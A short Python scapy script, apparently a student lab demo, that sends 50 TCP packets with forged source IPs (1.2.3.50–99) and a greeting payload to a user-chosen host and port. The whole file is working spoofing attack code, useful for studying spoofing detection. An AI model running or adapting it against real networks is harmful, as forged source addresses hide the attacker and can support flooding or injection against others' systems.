"""
Authors : Fridez Lucas, Maxime Welcklen
Attack :  Very basic TCP spoofing over N packets
"""

# Imports
from scapy.all import *
from scapy.layers.inet import *
import argparse


B = "192.168.1.103"  # destination IP address

D = 9999  # destination port
payload = "Hello from scappy spoofing !"  # packet payload


def __configure_argparse__():
    """Configure argparser

    Returns:
       parser: Arguments parser
    """
    parser = argparse.ArgumentParser(
        description='Spoofing attack arguments')

    # Required params
    requiredNamed = parser.add_argument_group('Optionnal named arguments')
    requiredNamed.add_argument(
        '-d', '--dst', help='Destination address', required=True)
    requiredNamed.add_argument(
        '-p', '--dport', type=int, help='Destination port', required=True)
    requiredNamed.add_argument(
        '-i', '--iface', help='Interface', required=True)

    return parser


def main(destination_ip, dport, iface):
    """Main method that handle attack logic

    Args:
       destination_ip (str): Destination IP
       dport (int) : Destination port
       iface (str) : Network interface
    """
    SOURCE_IP = "1.2.3."
    SOURCE_PORT = RandShort()

    # Send 50 packets to be really visible
    for i in range(50, 100):
        spoofed_packet = IP(src=f"{SOURCE_IP}{i}", dst=destination_ip) / \
            TCP(sport=SOURCE_PORT, dport=dport) / payload
        send(spoofed_packet, iface=iface)


# Entry point
# Run this script in sudo mode !
if __name__ == "__main__":
    parser = __configure_argparse__()
    args = parser.parse_args()
    main(args.dst, args.dport, args.iface)
